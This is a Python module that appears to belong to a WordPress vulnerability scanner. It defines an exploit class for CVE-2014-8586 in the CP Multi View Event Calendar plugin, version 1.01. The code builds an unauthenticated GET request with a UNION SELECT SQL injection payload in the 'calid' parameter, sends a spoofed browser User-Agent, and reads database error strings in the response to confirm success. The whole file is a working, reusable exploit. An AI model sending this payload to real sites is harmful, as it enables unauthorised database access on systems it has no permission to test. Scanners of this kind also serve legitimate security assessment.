from exploits.exploit import AbstractExploit


class CVE20148586(AbstractExploit):
    validators = [
        "You have an error in your SQL syntax",
        "WordPress database error"
    ]

    def get_name(self):
        return 'CP Multi View Event Calendar'

    def get_version(self):
        return 1.01

    def get_url(self):
        return '?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1%20UNION%20ALL%20SELECT%20NULL' + \
               ',NULL,NULL,NULL,NULL,CONCAT(--VULNPRESS--,0x7171736971,0x6f7642724e6743615973,0x716b716671),NULL' + \
               ',NULL,NULL,NULL,NULL,NULL,NULL,NULL#'

    def get_nonce_url(self):
        return None

    def get_request_method(self):
        return 'GET'

    def get_body(self):
        return None

    def is_url_encoded(self):
        return False

    def is_authenticated(self):
        return False

    def validate(self, response, **kwargs):
        validated = False
        if response is not None:
            for validator in self.validators:
                if validator in response:
                    validated = True
        return validated

    @staticmethod
    def get_headers():
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                          "Chrome/36.0.1985.125 Safari/537.36"
        }
